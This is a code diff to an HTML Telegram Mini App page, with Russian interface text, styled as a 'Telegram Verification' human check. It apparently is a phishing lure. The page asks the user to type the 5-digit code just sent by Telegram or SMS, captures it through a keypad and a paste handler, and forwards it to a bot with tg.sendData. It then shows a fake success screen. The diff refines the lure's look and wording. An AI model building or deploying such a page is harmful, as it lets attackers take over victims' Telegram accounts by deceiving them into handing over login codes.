@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Code Verification</title>
+    <title>Telegram Verification</title>
     <meta name="theme-color" content="#0088cc">
     <style>
         * {
@@ -13,35 +13,34 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-            background: #000000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            padding: 15px;
         }
         
-        .app-container {
+        .container {
             background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             width: 100%;
-            max-width: 400px;
+            max-width: 380px;
+            border-radius: 20px;
             overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
         }
         
         .header {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0088cc 0%, #005f99 100%);
             color: white;
-            padding: 30px 20px;
+            padding: 25px 20px;
             text-align: center;
         }
         
         .header h1 {
-            font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 10px;
+            font-size: 22px;
+            margin-bottom: 5px;
         }
         
         .header p {
@@ -50,139 +49,130 @@
         }
         
         .content {
-            padding: 30px;
+            padding: 25px;
         }
         
-        .hand-animation {
-            text-align: center;
+        .hand-wave {
             font-size: 60px;
-            margin: 20px 0;
-            animation: wave 1.5s infinite;
+            text-align: center;
+            margin: 15px 0;
+            animation: wave 2s infinite;
         }
         
         @keyframes wave {
             0%, 100% { transform: rotate(0deg); }
-            25% { transform: rotate(-10deg); }
-            75% { transform: rotate(10deg); }
+            25% { transform: rotate(-20deg); }
+            75% { transform: rotate(20deg); }
         }
         
-        .verification-text {
+        .verify-box {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid #e9ecef;
+        }
+        
+        .verify-text {
             text-align: center;
-            margin: 20px 0;
-            line-height: 1.6;
+            margin-bottom: 20px;
         }
         
-        .verification-text h2 {
+        .verify-text h2 {
             color: #333;
             font-size: 18px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            line-height: 1.4;
         }
         
-        .verification-text p {
+        .verify-text p {
             color: #666;
             font-size: 14px;
+            line-height: 1.4;
         }
         
-        .confirm-button {
+        .confirm-btn {
             background: #0088cc;
             color: white;
             border: none;
             border-radius: 25px;
-            padding: 15px 30px;
+            padding: 15px;
             font-size: 16px;
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: all 0.3s;
-            margin: 20px 0;
+            transition: 0.3s;
+            margin-top: 10px;
         }
         
-        .confirm-button:hover {
+        .confirm-btn:hover {
             background: #0077b3;
             transform: translateY(-2px);
         }
         
-        .confirm-button:active {
-            transform: translateY(0);
-        }
-        
-        .phone-animation {
-            text-align: center;
+        .phone-icon {
             font-size: 50px;
-            margin: 20px 0;
+            text-align: center;
+            margin: 15px 0;
         }
         
         .code-instruction {
             text-align: center;
-            margin: 20px 0;
-            line-height: 1.6;
+            margin: 15px 0;
         }
         
-        .code-instruction h3 {
-            color: #333;
-            font-size: 16px;
-            margin-bottom: 10px;
-        }
-        
-        .code-display {
+        .code-inputs {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 8px;
             margin: 20px 0;
         }
         
-        .code-digit {
-            width: 50px;
-            height: 70px;
+        .code-box {
+            width: 45px;
+            height: 60px;
             border: 2px solid #ddd;
             border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 28px;
+            font-size: 24px;
             font-weight: bold;
             background: white;
         }
         
-        .code-digit.filled {
+        .code-box.filled {
             border-color: #0088cc;
-            background: #e6f7ff;
+            background: #f0f9ff;
         }
         
-        .learn-code-button {
+        .learn-btn {
             background: #0088cc;
             color: white;
             border: none;
             border-radius: 20px;
-            padding: 12px 25px;
+            padding: 10px 20px;
             font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin: 10px auto;
             display: block;
-            transition: all 0.3s;
-        }
-        
-        .learn-code-button:hover {
-            background: #0077b3;
+            margin: 0 auto 15px;
+            cursor: pointer;
         }
         
         .keyboard {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
+            gap: 8px;
             margin-top: 20px;
         }
         
         .key {
             background: white;
             border: 2px solid #e0e0e0;
-            border-radius: 15px;
+            border-radius: 12px;
             padding: 15px 0;
-            font-size: 20px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
-            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -198,16 +188,25 @@
             border-color: #ff6b6b;
         }
         
+        .key.submit {
+            background: #28a745;
+            color: white;
+            border-color: #28a745;
+        }
+        
         .timer {
             text-align: center;
             color: #666;
-            font-size: 14px;
-            margin: 15px 0;
+            font-size: 13px;
+            margin: 10px 0;
         }
         
-        .timer span {
-            color: #0088cc;
-            font-weight: bold;
+        .error {
+            color: #dc3545;
+            text-align: center;
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
         }
         
         .loading {
@@ -238,8 +237,8 @@
         }
         
         .success-icon {
-            width: 70px;
-            height: 70px;
+            width: 60px;
+            height: 60px;
             background: #28a745;
             border-radius: 50%;
             display: flex;
@@ -247,163 +246,137 @@
             justify-content: center;
             margin: 0 auto 20px;
             color: white;
-            font-size: 35px;
-        }
-        
-        .error {
-            color: #dc3545;
-            font-size: 14px;
-            text-align: center;
-            margin: 10px 0;
-            display: none;
-        }
-        
-        @media (max-width: 480px) {
-            .app-container {
-                border-radius: 15px;
-            }
-            
-            .content {
-                padding: 20px;
-            }
-            
-            .code-digit {
-                width: 40px;
-                height: 60px;
-                font-size: 24px;
-            }
-            
-            .key {
-                padding: 12px 0;
-                font-size: 18px;
-            }
+            font-size: 30px;
         }
     </style>
 </head>
 <body>
-    <div class="app-container" id="app">
+    <div class="container">
+        <!-- Экран 1: Подтверждение -->
         <div id="screen1">
             <div class="header">
                 <h1>Telegram Verification</h1>
-                <p>Безопасное подтверждение личности</p>
+                <p>Безопасное подключение</p>
             </div>
             
             <div class="content">
-                <div class="hand-animation">👋</div>
+                <div class="hand-wave">👋</div>
                 
-                <div class="verification-text">
-                    <h2>Нужно подтвердить, что вы настоящий человек</h2>
-                    <p>Нажмите на кнопку ниже для начала!</p>
+                <div class="verify-box">
+                    <div class="verify-text">
+                        <h2>Нужно подтвердить, что вы настоящий человек</h2>
+                        <p>Нажмите на кнопку ниже для начала!</p>
+                    </div>
+                    
+                    <button class="confirm-btn" id="confirmBtn">Подтвердить</button>
                 </div>
-                
-                <button class="confirm-button" id="confirmButton">Подтвердить</button>
             </div>
         </div>
         
+        <!-- Экран 2: Ввод кода -->
         <div id="screen2" style="display: none;">
             <div class="header">
-                <h1>Введите код</h1>
+                <h1>Ввод кода</h1>
                 <p>Код из Telegram/SMS</p>
             </div>
             
             <div class="content">
-                <div class="phone-animation">📲</div>
+                <div class="phone-icon">📲</div>
                 
                 <div class="code-instruction">
                     <h3>Введите 5-значный код, который мы вам только что отправили!</h3>
                 </div>
                 
-                <div class="code-display" id="codeDisplay">
-                    <div class="code-digit"></div>
-                    <div class="code-digit"></div>
-                    <div class="code-digit"></div>
-                    <div class="code-digit"></div>
-                    <div class="code-digit"></div>
+                <div class="code-inputs" id="codeInputs">
+                    <div class="code-box"></div>
+                    <div class="code-box"></div>
+                    <div class="code-box"></div>
+                    <div class="code-box"></div>
+                    <div class="code-box"></div>
                 </div>
                 
-                <button class="learn-code-button" id="learnCodeButton">Узнать код</button>
+                <button class="learn-btn" id="learnBtn">Узнать код</button>
                 
                 <div class="keyboard" id="keyboard">
-                    <!-- Будет заполнено JavaScript -->
+                    <!-- Заполнится JS -->
                 </div>
                 
                 <div class="timer" id="timer">
-                    ⏱ Код действителен: <span id="time">05:00</span>
+                    ⏱ Время: <span id="time">05:00</span>
                 </div>
                 
-                <div class="error" id="errorMessage">
-                    Неверный код. Попробуйте еще раз.
+                <div class="error" id="errorMsg">
+                    Неверный код
                 </div>
             </div>
         </div>
         
+        <!-- Загрузка -->
         <div class="loading" id="loading">
             <div class="spinner"></div>
             <p>Проверяем код...</p>
         </div>
         
+        <!-- Успех -->
         <div class="success" id="success">
             <div class="success-icon">✓</div>
-            <h2>Успешно!</h2>
-            <p>Закройте окно для продолжения</p>
+            <h2>Подтверждено!</h2>
+            <p>Можно закрывать окно</p>
         </div>
     </div>
 
     <script>
-        // Инициализация Telegram Web App
+        // Telegram Web App
         const tg = window.Telegram?.WebApp;
-        
         if (tg) {
             tg.expand();
             tg.ready();
-            console.log('Telegram Web App initialized');
+            console.log('Telegram Web App готов');
         }
         
-        let currentScreen = 1;
+        // Переменные
         let code = '';
-        let timeLeft = 300; // 5 минут в секундах
+        let timeLeft = 300; // 5 минут
         
-        // Элементы DOM
+        // Элементы
         const screen1 = document.getElementById('screen1');
         const screen2 = document.getElementById('screen2');
-        const confirmButton = document.getElementById('confirmButton');
-        const learnCodeButton = document.getElementById('learnCodeButton');
-        const codeDisplay = document.getElementById('codeDisplay');
+        const confirmBtn = document.getElementById('confirmBtn');
+        const learnBtn = document.getElementById('learnBtn');
+        const codeInputs = document.getElementById('codeInputs');
         const keyboard = document.getElementById('keyboard');
-        const timerElement = document.getElementById('timer');
-        const timeElement = document.getElementById('time');
-        const errorMessage = document.getElementById('errorMessage');
+        const timer = document.getElementById('timer');
+        const timeSpan = document.getElementById('time');
+        const errorMsg = document.getElementById('errorMsg');
         const loading = document.getElementById('loading');
         const success = document.getElementById('success');
         
-        // Переход к экрану ввода кода
-        confirmButton.addEventListener('click', () => {
+        // Кнопка подтверждения
+        confirmBtn.addEventListener('click', () => {
             screen1.style.display = 'none';
             screen2.style.display = 'block';
-            currentScreen = 2;
             
-            // Отправляем данные о подтверждении
+            // Сообщаем боту
             if (tg) {
                 tg.sendData(JSON.stringify({
-                    action: 'confirmed',
-                    timestamp: Date.now()
+                    action: 'human_confirmed',
+                    time: Date.now()
                 }));
             }
             
-            generateKeyboard();
+            // Создаем клавиатуру
+            createKeyboard();
             updateCodeDisplay();
             startTimer();
         });
         
         // Кнопка "Узнать код"
-        learnCodeButton.addEventListener('click', () => {
-            alert("📱 Код отправлен в:\n1. Официальное приложение Telegram\n2. СМС сообщение\n3. Проверьте входящие сообщения");
+        learnBtn.addEventListener('click', () => {
+            alert("🔍 Код можно найти:\n\n1. В приложении Telegram\n2. В СМС сообщении\n3. Проверьте уведомления");
         });
         
-        // Генерируем цифровую клавиатуру
-        function generateKeyboard() {
-            keyboard.innerHTML = '';
-            
+        // Создание клавиатуры
+        function createKeyboard() {
             const keys = [
                 ['1', '2', '3'],
                 ['4', '5', '6'],
@@ -411,24 +384,25 @@
                 ['⌫', '0', '✓']
             ];
             
+            keyboard.innerHTML = '';
+            
             keys.forEach(row => {
                 row.forEach(key => {
-                    const button = document.createElement('div');
-                    button.className = 'key';
-                    button.textContent = key;
+                    const btn = document.createElement('div');
+                    btn.className = 'key';
+                    btn.textContent = key;
                     
                     if (key === '⌫') {
-                        button.classList.add('delete');
-                        button.addEventListener('click', deleteDigit);
+                        btn.classList.add('delete');
+                        btn.addEventListener('click', deleteDigit);
                     } else if (key === '✓') {
-                        button.style.background = '#0088cc';
-                        button.style.color = 'white';
-                        button.addEventListener('click', submitCode);
+                        btn.classList.add('submit');
+                        btn.addEventListener('click', submitCode);
                     } else {
-                        button.addEventListener('click', () => addDigit(key));
+                        btn.addEventListener('click', () => addDigit(key));
                     }
                     
-                    keyboard.appendChild(button);
+                    keyboard.appendChild(btn);
                 });
             });
         }
@@ -453,14 +427,14 @@
         
         // Обновить отображение кода
         function updateCodeDisplay() {
-            const digits = codeDisplay.querySelectorAll('.code-digit');
-            digits.forEach((digit, index) => {
-                if (index < code.length) {
-                    digit.textContent = code[index];
-                    digit.classList.add('filled');
+            const boxes = codeInputs.querySelectorAll('.code-box');
+            boxes.forEach((box, i) => {
+                if (i < code.length) {
+                    box.textContent = code[i];
+                    box.classList.add('filled');
                 } else {
-                    digit.textContent = '';
-                    digit.classList.remove('filled');
+                    box.textContent = '';
+                    box.classList.remove('filled');
                 }
             });
         }
@@ -468,12 +442,12 @@
         // Отправить код
         function submitCode() {
             if (code.length !== 5) {
-                showError('Введите все 5 цифр кода');
+                showError('Нужно 5 цифр');
                 return;
             }
             
             if (timeLeft <= 0) {
-                showError('Время истекло. Запросите новый код.');
+                showError('Время вышло');
                 return;
             }
             
@@ -481,7 +455,7 @@
             screen2.style.display = 'none';
             loading.style.display = 'block';
             
-            // Отправляем данные в Telegram бота
+            // Отправляем в бота
             const data = {
                 action: 'verify_code',
                 code: code,
@@ -491,19 +465,19 @@
             if (tg) {
                 tg.sendData(JSON.stringify(data));
                 
-                // Показываем успех через 1.5 секунды
+                // Успех
                 setTimeout(() => {
                     loading.style.display = 'none';
                     success.style.display = 'block';
                     
-                    // Закрываем через 2 секунды
+                    // Закрыть
                     setTimeout(() => {
                         tg.close();
                     }, 2000);
                 }, 1500);
             } else {
-                // Для тестирования
-                console.log('Код отправлен:', data);
+                // Для теста
+                console.log('Отправляем:', data);
                 loading.style.display = 'none';
                 success.style.display = 'block';
             }
@@ -511,40 +485,39 @@
         
         // Таймер
         function startTimer() {
-            updateTimerDisplay();
+            updateTimer();
             
-            const timer = setInterval(() => {
+            const interval = setInterval(() => {
                 if (timeLeft > 0) {
                     timeLeft--;
-                    updateTimerDisplay();
+                    updateTimer();
                 } else {
-                    clearInterval(timer);
-                    showError('Время истекло. Запросите новый код.');
+                    clearInterval(interval);
+                    showError('Время истекло');
                 }
             }, 1000);
         }
         
-        function updateTimerDisplay() {
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timeElement.textContent = 
-                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        function updateTimer() {
+            const min = Math.floor(timeLeft / 60);
+            const sec = timeLeft % 60;
+            timeSpan.textContent = `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
         }
         
-        function showError(message) {
-            errorMessage.textContent = message;
-            errorMessage.style.display = 'block';
+        function showError(msg) {
+            errorMsg.textContent = msg;
+            errorMsg.style.display = 'block';
         }
         
         function hideError() {
-            errorMessage.style.display = 'none';
+            errorMsg.style.display = 'none';
         }
         
-        // Автозаполнение из буфера обмена
+        // Автозаполнение
         document.addEventListener('paste', (e) => {
             e.preventDefault();
-            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
-            const numbers = pastedText.replace(/\D/g, '');
+            const text = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = text.replace(/\D/g, '');
             
             if (numbers.length >= 5) {
                 code = numbers.slice(0, 5);
@@ -553,9 +526,9 @@
             }
         });
         
-        // Инициализация при загрузке
+        // Инициализация
         document.addEventListener('DOMContentLoaded', () => {
-            console.log('Mini App loaded');
+            console.log('Mini App загружен');
         });
     </script>
 </body>
